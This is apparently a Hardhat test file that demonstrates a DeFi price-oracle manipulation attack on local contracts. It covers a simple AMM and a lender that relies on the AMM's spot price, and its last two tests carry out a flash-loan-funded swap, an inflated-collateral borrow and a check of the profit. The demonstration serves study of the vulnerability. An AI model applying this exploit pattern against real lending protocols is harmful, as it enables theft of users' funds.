const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const { calculateSwapAmountTo } = require("./utils");

describe("SimpleAMM", function () {
  let usdc;
  let amm;
  let lender;
  let attacker;

  let collateralizationRatio = 8000; // 80%

  beforeEach(async function () {
    const TestUSDC = await ethers.getContractFactory("TestUSDC");
    usdc = await TestUSDC.deploy("test", "tst");
    await usdc.deployed();

    const SimpleAMM = await ethers.getContractFactory("SimpleAMM");
    amm = await SimpleAMM.deploy(usdc.address);
    await amm.deployed();

    const SimpleLender = await ethers.getContractFactory("SimpleLender");
    lender = await SimpleLender.deploy(
      usdc.address,
      amm.address,
      collateralizationRatio
    );
    await lender.deployed();

    const Attacker = await ethers.getContractFactory("Attacker");
    attacker = await Attacker.deploy();
    await attacker.deployed();
  });

  it("Should be able to deposit into AMM and perform basic swap", async function () {
    const [acc1] = await ethers.getSigners();
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));

    // Deposit 3000 USDC
    const balanceTo = ethers.utils.parseEther("3000");
    await usdc.transfer(amm.address, balanceTo);
    expect(await amm.balanceUSDC()).to.equal(balanceTo);

    // Deposit 1 ETH
    const balanceFrom = ethers.utils.parseEther("1");
    await acc1.sendTransaction({
      to: amm.address,
      value: balanceFrom,
    });
    expect(await amm.balanceETH()).to.equal(balanceFrom);

    // Check expected prices
    expect(await amm.priceETHUSDC()).to.equal(ethers.utils.parseEther("3000"));
    expect(await amm.priceUSDCETH()).to.equal(
      ethers.utils.parseEther("1").div(3000)
    );

    // Swap 0.01 ETH for USDC
    const fromAmount = ethers.utils.parseEther("0.01");
    await amm.swap(ethers.constants.AddressZero, fromAmount, {
      value: fromAmount,
    });

    // Expect to receive `toAmount` USDC
    const toAmount = calculateSwapAmountTo(balanceFrom, balanceTo, fromAmount);
    const usdcBal = await usdc.balanceOf(acc1.address);
    expect(usdcBal).to.equal(toAmount);

    expect(await amm.balanceETH()).to.equal(balanceFrom.add(fromAmount));
    expect(await amm.balanceUSDC()).to.equal(balanceTo.sub(toAmount));
  });

  it("Should be able to calculate and borrow max amount correctly", async function () {
    const [acc1] = await ethers.getSigners();
    await usdc.mint(acc1.address, ethers.utils.parseEther("6000"));

    // Initialize amm pool with 1 ETH and 3000 USDC
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // Initialize lender contract with eth reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("10"),
    });

    // Deposit 3000 USDC into lender
    const depositAmount = ethers.utils.parseEther("3000");
    await usdc.approve(lender.address, depositAmount);
    await lender.depositUSDC(depositAmount);
    expect(await lender.USDCdeposits(acc1.address)).to.equal(depositAmount);

    // Check max borrow amount at current AMM price
    const maxBorrow = await lender.maxBorrowAmount();
    // close to but not exactly 0.8 eth due to rounding errors
    expect(maxBorrow).to.equal(BigNumber.from("799999999999999200"));

    // Borrow max borrow amount from lender
    await lender.borrowETH(maxBorrow);
    expect(await ethers.provider.getBalance(lender.address)).to.equal(
      ethers.utils.parseEther("10").sub("799999999999999200")
    );
  });

  it("Execute oracle attack (multiple txs breakdown)", async function () {
    /// INIT ///

    // Create fresh attacker wallet to start at 0 ETH, seed with 0.1 ETH for gas
    const [acc1] = await ethers.getSigners();
    const attacker = ethers.Wallet.createRandom().connect(ethers.provider);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(0);
    await acc1.sendTransaction({
      to: attacker.address,
      value: ethers.utils.parseEther("0.1"),
    });

    // Initialize amm pool with 1 ETH and 3000 USDC
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // -- expect (original) price 1 USDC = 0.00033... ETH
    expect(ethers.utils.formatEther(await amm.priceUSDCETH())).to.equal(
      "0.000333333333333333"
    );

    // Initialize lender contract with eth reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("5"),
    });

    /// EXECUTE ///

    // 1. Simulate a flash loan 2 ETH from acc1
    await acc1.sendTransaction({
      to: attacker.address,
      value: ethers.utils.parseEther("2"),
    });

    // 2. Swap 2 ETH for USDC in shallow liquidiity amm to manipulate price oracle
    const fromAmount = ethers.utils.parseEther("2");
    await amm.connect(attacker).swap(ethers.constants.AddressZero, fromAmount, {
      value: fromAmount,
    });
    // -- calculate expected 2000 USDC received from swap due to price impact
    const toAmount = calculateSwapAmountTo(
      ethers.utils.parseEther("1"),
      ethers.utils.parseEther("3000"),
      fromAmount
    );
    expect(toAmount).to.equal(ethers.utils.parseEther("2000"));

    // -- expect AMM pool = 3 ETH, 1000 USDC
    expect(ethers.utils.formatEther(await amm.balanceETH())).to.equal("3.0");
    expect(ethers.utils.formatEther(await amm.balanceUSDC())).to.equal(
      "1000.0"
    );

    // -- expect (manipulated) price 1 USDC = 0.003 ETH
    expect(ethers.utils.formatEther(await amm.priceUSDCETH())).to.equal(
      "0.003"
    );

    // 4. Deposit 2000 USDC into lender contract
    const depositAmount = ethers.utils.parseEther("2000");
    await usdc.connect(attacker).approve(lender.address, depositAmount);
    await lender.connect(attacker).depositUSDC(depositAmount);
    expect(await lender.USDCdeposits(attacker.address)).to.equal(depositAmount);

    // 5. Borrow maximum amount of ETH (4.8) using 2000 USDC as collateral with the manipulated AMM price feed
    const maxBorrow = await lender.connect(attacker).maxBorrowAmount();
    expect(maxBorrow).to.equal(ethers.utils.parseEther("4.8"));
    await lender.connect(attacker).borrowETH(maxBorrow);
    expect(await ethers.provider.getBalance(lender.address)).to.equal(
      ethers.utils.parseEther("0.2") // 5 - 4.8
    );

    // 6. Repay flash loan of 2 eth
    await attacker.sendTransaction({
      to: acc1.address,
      value: ethers.utils.parseEther("2"),
    });

    // 7. Keep ETH profits (deposited USDC will be liquidiated)
    // -- final profits = ~2.8 ETH + 0.1 ETH from the beginning for gas
    const profit = ethers.utils.formatEther(
      await ethers.provider.getBalance(attacker.address)
    );
    expect(Math.round(profit * 1e1) / 1e1).to.equal(2.9);
  });

  it("Execute oracle attack (single transaction flash loan)", async function () {
    /// INIT ///
    const [acc1] = await ethers.getSigners();

    // Initialize amm pool with 1 ETH and 3000 USDC
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // Initialize lender contract with eth reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("5"),
    });

    /// EXECUTE ///
    // Simulates a flash loan by sending 2 eth along with the call to the Attacker
    // contract, which gets repaid at the end of the transaction
    await attacker.executeAttack(amm.address, usdc.address, lender.address, {
      value: ethers.utils.parseEther("2"),
    });

    // 2.8 ETH profit
    expect(
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address)
      )
    ).to.equal("2.8");
  });
});
